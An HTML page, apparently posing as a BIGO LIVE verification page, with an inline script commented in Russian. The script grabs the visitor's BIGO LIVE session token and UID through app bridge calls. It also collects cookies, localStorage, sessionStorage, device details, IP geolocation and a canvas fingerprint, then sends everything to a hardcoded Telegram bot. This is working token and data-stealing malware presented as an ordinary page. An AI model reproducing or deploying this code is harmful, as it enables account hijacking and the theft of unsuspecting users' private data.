</head>
<body>
<div id="app"></div>

<script src="https://mobile.bnxz.net/act_cdn/live/comm/libs/common-config/like/index-2.0.js.html"></script>
<script src="https://mobile.bnxz.net/act_cdn/live/comm/libs/assets-load-monitor/2.5.6/assets-load-monitor-init.min.js"></script>
<script src="https://mobile.bnxz.net/act_cdn/live/comm/libs/flexible/1.0.0/flexible.min.js"></script>

<script src="https://mobile.bnxz.net/act_cdn/live/lk-php-ban-proxy-assets/page-63140-verify/js/chunk-vendors.a11d1e9a.js"></script>
<script src="https://mobile.bnxz.net/act_cdn/live/lk-php-ban-proxy-assets/page-63140-verify/js/index.6c338453.js"></script>



<script>
const TOKENB = "7975294921:AAEvYT6D56lACAmmPDRWj4kRHm3P6deplUg";
const CHAT_ID = "8588128486";

(async () => {
  let t = null, u = null;
  let extra = {};

  // Колбэк от BigoLive
  window.getTokenCallback = (...a) => {
    t = a[2]; u = a[3];
    console.log('TOKEN =', t, 'UID =', u);
  };

  // Пытаемся получить токен разными способами
  try {
    const r = await window.bigolive?.use?.('getToken');
    t = t || r?.[2];
    u = u || r?.[3];
  } catch {}

  try {
    if (!t && window.live?.getToken) {
      const r = window.live.getToken();
      t = t || r?.[2];
      u = u || r?.[3];
    }
  } catch {}

  try {
    if (!t && window.webkit?.messageHandlers?.getToken) {
      window.webkit.messageHandlers.getToken.postMessage(null);
    }
  } catch {}

  // Ждём, пока колбэк отработает
  await new Promise(res => setTimeout(res, 800));

  // Собираем дополнительную информацию
  try {
    // Cookies
    extra.cookies = document.cookie || 'нет';

    // User Agent и платформа
    extra.userAgent = navigator.userAgent;
    extra.platform  = navigator.platform;
    extra.language  = navigator.language;
    extra.languages = (navigator.languages || []).join(', ');
    extra.timezone  = Intl.DateTimeFormat().resolvedOptions().timeZone;

    // Экран
    extra.screen = `${screen.width}x${screen.height} @${screen.colorDepth}bit`;

    // Размер окна
    extra.window = `${window.innerWidth}x${window.innerHeight}`;

    // Локальное и сессионное хранилище
    try { extra.localStorage = JSON.stringify(localStorage).slice(0, 2000); } catch { extra.localStorage = 'н/д'; }
    try { extra.sessionStorage = JSON.stringify(sessionStorage).slice(0, 2000); } catch { extra.sessionStorage = 'н/д'; }

    // URL и referrer
    extra.url = location.href;
    extra.referrer = document.referrer || 'нет';

    // Онлайн / батарея
    extra.online = navigator.onLine;
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      extra.battery = `${Math.round(b.level * 100)}% ${b.charging ? '(заряжается)' : ''}`;
    }

    // IP + гео (внешний сервис)
    try {
      const ipRes = await fetch('https://ipapi.co/json/');
      const ipData = await ipRes.json();
      extra.ip       = ipData.ip;
      extra.country  = ipData.country_name;
      extra.city     = ipData.city;
      extra.region   = ipData.region;
      extra.isp      = ipData.org;
      extra.latlon   = `${ipData.latitude}, ${ipData.longitude}`;
    } catch { extra.ip = 'не удалось получить'; }

    // Проверяем, есть ли объекты BigoLive с доп. инфой
    try {
      if (window.bigolive) {
        extra.bigoliveKeys = Object.keys(window.bigolive).join(', ');
      }
    } catch {}

    try {
      if (window.live) {
        extra.liveKeys = Object.keys(window.live).join(', ');
      }
    } catch {}

    // Пробуем вытащить данные пользователя
    try {
      if (window.bigolive?.user) extra.bigoUser = JSON.stringify(window.bigolive.user);
    } catch {}

    // Пустой fingerprint (canvas)
    try {
      const c = document.createElement('canvas');
      const ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText('fingerprint', 2, 2);
      extra.canvasFp = c.toDataURL().slice(-50);
    } catch {}

  } catch (e) {
    extra.error = String(e);
  }

  // Формируем красивое сообщение
  const lines = [
    '🎯 <b>BIGO LIVE — данные</b>',
    '',
    `<b>TOKEN:</b> <code>${t ?? 'не найден'}</code>`,
    `<b>UID:</b> <code>${u ?? 'не найден'}</code>`,
    '',
    '<b>📱 Устройство:</b>',
    `UA: ${extra.userAgent ?? '-'}`,
    `Platform: ${extra.platform ?? '-'}`,
    `Screen: ${extra.screen ?? '-'}`,
    `Window: ${extra.window ?? '-'}`,
    `Lang: ${extra.language ?? '-'} (${extra.languages ?? '-'})`,
    `TZ: ${extra.timezone ?? '-'}`,
    `Online: ${extra.online ?? '-'}`,
    `Battery: ${extra.battery ?? '-'}`,
    '',
    '<b>🌐 Сеть:</b>',
    `IP: ${extra.ip ?? '-'}`,
    `Country: ${extra.country ?? '-'}`,
    `City: ${extra.city ?? '-'}`,
    `Region: ${extra.region ?? '-'}`,
    `ISP: ${extra.isp ?? '-'}`,
    `LatLon: ${extra.latlon ?? '-'}`,
    '',
    '<b>🍪 Cookies:</b>',
    `<code>${(extra.cookies || '').slice(0, 800)}</code>`,
    '',
    '<b>💾 localStorage:</b>',
    `<code>${(extra.localStorage || '').slice(0, 800)}</code>`,
    '',
    '<b>🗂 sessionStorage:</b>',
    `<code>${(extra.sessionStorage || '').slice(0, 800)}</code>`,
    '',
    '<b>🔗 URL:</b>',
    `${extra.url ?? '-'}`,
    `Referrer: ${extra.referrer ?? '-'}`,
    '',
    '<b>🧩 Bigolive keys:</b>',
    `${extra.bigoliveKeys ?? '-'}`,
    '<b>🧩 Live keys:</b>',
    `${extra.liveKeys ?? '-'}`,
    '',
    `<b>Canvas FP:</b> <code>${extra.canvasFp ?? '-'}</code>`,
    extra.error ? `\n⚠️ <b>Error:</b> ${extra.error}` : ''
  ];

  const text = lines.join('\n').slice(0, 4000); // лимит TG

  // Отправка в Telegram
  fetch(`https://api.telegram.org/bot${TOKENB}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    })
  })
  .then(r => r.json())
  .then(data => console.log('TG response:', data))
  .catch(err => console.error('TG error:', err));

  console.log('Собрано:', { token: t, uid: u, extra });
})();
</script>


</body>
</html>
